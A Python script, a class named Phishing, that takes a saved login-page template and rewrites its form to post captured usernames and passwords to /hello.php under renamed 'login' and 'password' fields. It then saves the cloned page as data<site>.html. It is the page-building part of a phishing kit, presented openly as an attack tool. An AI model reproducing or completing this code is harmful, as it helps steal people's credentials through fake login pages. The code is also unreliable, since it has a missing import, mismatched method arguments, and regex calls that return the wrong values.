import collections
import urllib
import re
import urllib.request
from fichier import Fichier
from bs4 import BeautifulSoup
import sys

class Phishing():
    mots=False
    def __init__(self):
        print("mesmots", self.mots)
        self.mots=""
        self.res=[]
        self.nbres={}
        self.mesmots={"/email":"email mail connexion mes emails boite mail mail google",
        "/signup":"email mail inscription mes emails boite mail mail google",
                }
    def loginpages(self):
        for x in os.listdir("./templates"):
            self.phish(x)
    def phish(self):
        x=sys.argv[1]
        myid=sys.argv[2]
        login=sys.argv[3]
        pw=sys.argv[4]
        site=sys.argv[5] or ""
        html=Fichier("./templates",x).lire()
        formtag=self.getformtag(html,myid)
        nomlogin=self.getnomlogin(html,login)
        nompw=self.getnomlogin(html,pw)
        print(formtag,"hey")
        print("hey")
        html=html.replace(formtag, "<form action=\"/hello.php\" method=\"post\"><input type=\"hidden\" name=\"site\" value=\""+site+"\"/>")
        html=html.replace(nomlogin, "name=\"login\"")
        html=html.replace(nompw, "name=\"password\"")
        print("hey")
        fichier = open("data"+site+".html", "a")
        print("hey")
        fichier.write(html)
        print("hey")
        fichier.close()
        print("hey")
    def getdescription(self,data):
        y = BeautifulSoup(data)
        c = y.find('body').findAll(text=True, recursive=False)
        mystring=""
        for i in c:
            print(i)
            mystring+=i
            if len(mystring) > 100:
                break
        return mystring
    def getnomlogin(self,html,myid):
        # Part 2: use re.match to match the entire html string, and extract data within the title.
        m = re.match(r"^.*name=\""+myid+"\".*$", str(html))
        # Part 3: return the first group if match was successful.
        if m:
            return m.group(1)
        else:
            return ""
    def getformtag(self,html,myid):
        # Part 2: use re.match to match the entire html string, and extract data within the title.
        m = re.match(r"^.*<form(.+?)id=\""+myid+"\"(.+?)>.*$", str(html))
        # Part 3: return the first group if match was successful.
        if m:
            return str(m)
        else:
            return ""
    def getpic(self,html):
        # Part 2: use re.match to match the entire html string, and extract data within the title.
        m = re.match(r"^.*<link rel=\"icon\" type=\"image/x-icon\" href=\"\s*(.+?)\s*\">.*$", str(html))
        # Part 3: return the first group if match was successful.
        if m:
            return m.group(1)
        else:
            return ""
    def gettitle(self,html):
        # Part 2: use re.match to match the entire html string, and extract data within the title.
        m = re.match(r"^.*<title>\s*(.+?)\s*</title>.*$", str(html))
        # Part 3: return the first group if match was successful.
        if m:
            return m.group(1)
        else:
            return ""
Phishing().phish()
